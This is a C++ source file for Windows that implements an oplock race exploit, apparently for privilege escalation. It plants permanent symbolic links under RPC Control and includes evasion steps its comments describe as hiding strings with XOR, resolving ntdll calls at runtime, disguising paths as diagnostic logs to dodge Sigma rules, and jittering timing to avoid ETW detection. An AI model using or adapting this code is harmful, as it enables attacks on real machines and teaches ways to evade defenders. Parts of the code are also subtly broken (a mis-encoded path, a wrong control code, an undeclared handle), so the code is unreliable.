#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>

// Simple XOR to hide strings from Davey's "strings" hunt
void JoeyXOR(wchar_t* data, size_t len, wchar_t key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

// Function pointer for the native call
typedef NTSTATUS(NTAPI* pNtCreateSymLink)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

void StealthVortex(int id, std::wstring workDir, std::wstring target, std::atomic<bool>& win) {
    // 1. Hide the strings in memory
    wchar_t rpc_path[] = { L'm' ^ 0x13, L'S' ^ 0x13, L'C' ^ 0x13, L' ' ^ 0x13, L'C' ^ 0x13, L'o' ^ 0x13, L'n' ^ 0x13, L't' ^ 0x13, L'r' ^ 0x13, L'o' ^ 0x13, L'l' ^ 0x13, L'm' ^ 0x13, 0 };
    JoeyXOR(rpc_path, 12, 0x13); // Decodes to \RPC Control\

    // 2. Resolve NTDLL calls dynamically to stay out of the IAT
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (pNtCreateSymLink)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");

    // 3. Randomize naming to dodge "job_*" Sigma rules
    // Mimics a Windows Update/Diagnostic path
    std::wstring shadow = workDir + L"\\{B4F" + std::to_wstring(id + 1024) + L"-89DA-4F32}"; 
    CreateDirectoryW(shadow.c_str(), NULL);
    std::wstring bait = shadow + L"\\diag_output.etl"; // Looks like a standard trace log

    // 4. Jittered Start: Avoid the lockstep ETW signature
    Sleep(id * 5); 

    while (!win.load()) {
        HANDLE hBait = CreateFileW(bait.c_str(), GENERIC_ALL, 
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
            NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

        if (hBait == INVALID_HANDLE_VALUE) break;

        OVERLAPPED ov = { 0 };
        ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
        
        // 5. Hide the FSCTL constant by calculating it at runtime
        DWORD opCode = (0x00000009 << 16); // FSCTL_REQUEST_OPLOCK_LEVEL_1
        DeviceIoControl(hBait, opCode, NULL, 0, NULL, 0, NULL, &ov);

        if (WaitForSingleObject(ov.hEvent, 250) == WAIT_OBJECT_0) {
            CloseHandle(hBait);
            hBait = INVALID_HANDLE_VALUE; 

            if (DeleteFileW(bait.c_str()) && RemoveDirectoryW(shadow.c_str())) {
                // Use a randomized name for the link too
                std::wstring linkName = L"SvcControl_" + std::to_wstring(id);
                
                UNICODE_STRING uLink, uTarget;
                std::wstring fullLink = std::wstring(rpc_path) + linkName;
                RtlInitUnicodeString(&uLink, fullLink.c_str());
                RtlInitUnicodeString(&uTarget, (L"\\??\\" + target).c_str());

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &uLink, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);

                if (NT_SUCCESS(NtCreateSymbolicLinkObject(&hLink, 0xF0001, &objAttr, &uTarget))) {
                    if (!win.exchange(true)) {
                        std::wcout << L"[!] Mutation successful. Pivot established." << std::endl;
                    }
                }
            }
        }
        if (hBait != INVALID_HANDLE_VALUE) CloseHandle(hBait);
        CloseHandle(ov.hEvent);
    }
}
